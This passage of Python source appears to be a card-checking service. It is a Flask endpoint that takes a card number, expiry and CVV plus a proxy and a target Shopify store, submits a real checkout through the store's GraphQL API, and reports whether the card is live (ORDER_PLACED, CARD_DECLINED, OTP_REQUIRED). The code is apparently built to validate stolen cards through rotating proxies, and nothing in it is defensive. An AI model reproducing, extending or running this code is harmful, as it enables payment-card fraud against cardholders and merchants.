                            return False, extract_clean_response(str(code)), gateway, total_price, currency
                return False, "Submit GraphQL error", gateway, total_price, currency
            submit_data = safe_get(sub_json, 'data', 'submitForCompletion', default={})
            if not isinstance(submit_data, dict):
                return False, "Empty submit response", gateway, total_price, currency
            result_type = submit_data.get('__typename', '')
            rid = None
            if result_type in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                receipt = submit_data.get('receipt', {})
                if isinstance(receipt, dict):
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    rid = receipt.get('id')
                if not rid:
                    return False, "Success but no receipt ID", gateway, total_price, currency
            elif result_type == 'SubmitFailed':
                return False, extract_clean_response(str(submit_data.get('reason', 'Unknown'))), gateway, total_price, currency
            elif result_type == 'SubmitRejected':
                errors = submit_data.get('errors') or []
                if errors and isinstance(errors[0], dict):
                    err0 = errors[0]
                    code = err0.get('code', '')
                    detail = err0.get('localizedMessage', '') or err0.get('nonLocalizedMessage', '')
                    if detail and code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                        return False, detail, gateway, total_price, currency
                    if code:
                        return False, code, gateway, total_price, currency
                return False, "Submit Rejected", gateway, total_price, currency
            elif result_type == 'Throttled':
                return False, "Throttled (submit)", gateway, total_price, currency
            else:
                receipt = submit_data.get('receipt')
                if isinstance(receipt, dict):
                    rid = receipt.get('id')
                if not rid:
                    return False, f"Unknown submit result: {result_type}", gateway, total_price, currency
            poll_payload = {'query': QUERY_POLL,
                            'variables': {'receiptId': rid, 'sessionToken': sst},
                            'operationName': 'PollForReceipt'}
            poll_params = {'operationName': 'PollForReceipt'}
            await asyncio.sleep(3)
            final_text = ''
            for i in range(5):
                _, final_text = await make_graphql_request(
                    session, graphql_url, poll_params, headers, poll_payload, proxy)
                if is_captcha_required(final_text or ""):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                pr, _ = safe_parse_json(final_text, f"poll_{i}")
                if pr:
                    receipt = safe_get(pr, 'data', 'receipt', default={})
                    if isinstance(receipt, dict) and receipt:
                        tname = receipt.get('__typename', '')
                        if tname == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif tname == 'FailedReceipt':
                            err = receipt.get('processingError', {})
                            if isinstance(err, dict) and err.get('__typename') == 'PaymentFailed':
                                code = err.get('code', '')
                                msg = err.get('messageUntranslated', '')
                                return True, (msg if msg and code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') else code or 'PAYMENT_FAILED'), gateway, total_price, currency
                            return True, ((err.get('code') if isinstance(err, dict) else None) or 'UNKNOWN_ERROR'), gateway, total_price, currency
                        elif tname == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        elif tname in ('ProcessingReceipt', 'WaitingReceipt'):
                            await asyncio.sleep(4)
                            continue
                if final_text and 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break
            if final_text and 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency
            fj, _ = safe_parse_json(final_text, "final")
            if fj:
                rc = safe_get(fj, 'data', 'receipt', 'processingError', 'code')
                if "shopify_payments" in str(fj):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                if rc:
                    return True, rc, gateway, total_price, currency
                return True, "MISMATCHED_BILL", gateway, total_price, currency
            if final_text:
                low = final_text.lower()
                code = extract_between(final_text, '{"code":"', '"')
                if 'actionreq' in low or 'action_required' in low:
                    return True, "OTP_REQUIRED", gateway, total_price, currency
                elif 'processedreceipt' in low:
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif 'failedreceipt' in low or 'declined' in low:
                    return True, code or "CARD_DECLINED", gateway, total_price, currency
            return False, "Unknown Result", gateway, total_price, currency
    except Exception as e:
        logger.error(traceback.format_exc())
        return False, f"Error Processing Card: {str(e)[:150]}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(),
            'ano': parts[2].strip(), 'cvv': parts[3].strip()}

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter (CC|MM|YYYY|CVV)", "status": False}), 400
        try:
            parts = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400
        variant_id = request.args.get('variant')
        success, message, gateway, price, currency = asyncio.run(
            process_card(parts['cc'], parts['mes'], parts['ano'], parts['cvv'],
                         site, variant_id, proxy_str))
        clean = extract_clean_response(message)
        try:
            price_val = float(price)
        except (ValueError, TypeError):
            price_val = 0.0
        return jsonify({
            "Gateway": gateway, "Price": price_val,
            "Response": clean, "Status": success, "cc": cc_string})
    except Exception as e:
        logger.error(traceback.format_exc())
        return jsonify({
            "error": str(e)[:200], "status": False, "Gateway": "UNKNOWN",
            "Price": 0.0, "Response": f"ERROR: {str(e)[:200]}",
            "cc": request.args.get('cc', '')}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
